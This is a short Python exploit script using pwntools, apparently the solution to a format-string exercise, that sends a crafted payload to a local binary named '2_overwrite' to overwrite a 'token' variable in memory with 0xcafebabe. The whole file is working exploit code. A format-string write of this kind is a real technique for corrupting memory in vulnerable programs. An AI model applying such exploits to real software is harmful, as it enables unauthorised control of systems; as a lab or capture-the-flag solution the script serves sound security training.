#!/usr/bin/python

from pwn import *

binary = "./2_overwrite"
p = process(binary)

# 0x804a028 <token>: 0xdeadbeef
# Target write: 0xcafebabe
token_addr = 0x0804a028 # 
lower_4_bytes = token_addr

def main():
	
	payload = fmtstr_payload(5, {token_addr: 0xcafebabe})

	# Send payload
	log.info("Sending payload: %s" %payload)
	p.sendline(payload)

	data = p.recvall()
	realdata = data[data.find("Token"):] 
	log.success(realdata)

if __name__ == "__main__":
	main()
